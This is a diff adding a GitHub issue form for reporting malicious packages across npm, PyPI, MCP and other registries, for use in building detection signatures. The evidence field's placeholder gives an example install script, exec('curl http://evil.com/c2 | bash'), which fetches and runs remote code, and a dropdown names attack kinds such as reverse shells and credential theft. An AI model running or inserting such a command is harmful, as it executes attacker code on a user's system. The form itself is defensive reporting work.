@@ -1,0 +1,87 @@
+name: Report a Malicious Package
+description: Found a package that steals data, runs malware, or looks suspicious? Report it here and we'll add it to the community signatures.
+title: "[malicious] <package-name> — <one line about what it does>"
+labels: ["signature-needed", "malicious-package"]
+body:
+  - type: markdown
+    attributes:
+      value: |
+        Thanks for reporting. Fill in what you know — you don't need to know everything.
+        We'll turn this into a detection signature that protects everyone.
+
+  - type: dropdown
+    id: ecosystem
+    attributes:
+      label: Package ecosystem
+      description: Which package manager is this from?
+      options:
+        - npm (JavaScript / Node)
+        - PyPI (Python)
+        - Maven (Java)
+        - Go modules
+        - RubyGems (Ruby)
+        - crates.io (Rust)
+        - HuggingFace (AI models)
+        - MCP Registry (AI agent tools)
+        - Other
+    validations:
+      required: true
+
+  - type: input
+    id: package-name
+    attributes:
+      label: Package name
+      placeholder: "e.g. evil-pkg or lodash (the real one) vs Iodash (the fake one)"
+    validations:
+      required: true
+
+  - type: input
+    id: affected-versions
+    attributes:
+      label: Affected versions
+      description: Which versions are malicious? Use * if all versions are bad.
+      placeholder: "e.g. 1.0.0 or * or >=2.0.0"
+
+  - type: dropdown
+    id: threat-type
+    attributes:
+      label: What does it do?
+      description: Pick the best match.
+      options:
+        - Steals environment variables or credentials
+        - Downloads and runs remote code
+        - Typosquatting (fake package pretending to be a real one)
+        - Backdoor or reverse shell
+        - Cryptomining
+        - Data exfiltration (sends files or data out)
+        - Prompt injection (for AI/MCP tools)
+        - Unsafe AI model (pickle exploit, etc.)
+        - Not sure / other
+    validations:
+      required: true
+
+  - type: textarea
+    id: evidence
+    attributes:
+      label: Evidence or description
+      description: What did you see? Paste suspicious code, a postinstall script, or a link to a security report. Even a few lines helps.
+      placeholder: |
+        e.g. The install.js script does:
+          exec('curl http://evil.com/c2 | bash')
+
+        Or: This package is named "lodahs" and its README pretends to be lodash.
+
+  - type: input
+    id: references
+    attributes:
+      label: Links (optional)
+      description: Socket.dev report, GitHub issue, security blog post, anything.
+      placeholder: "https://socket.dev/npm/package/evil-pkg"
+
+  - type: checkboxes
+    id: confirm
+    attributes:
+      label: Confirmation
+      options:
+        - label: I'm reporting this in good faith — this package appears genuinely malicious or suspicious
+          required: true
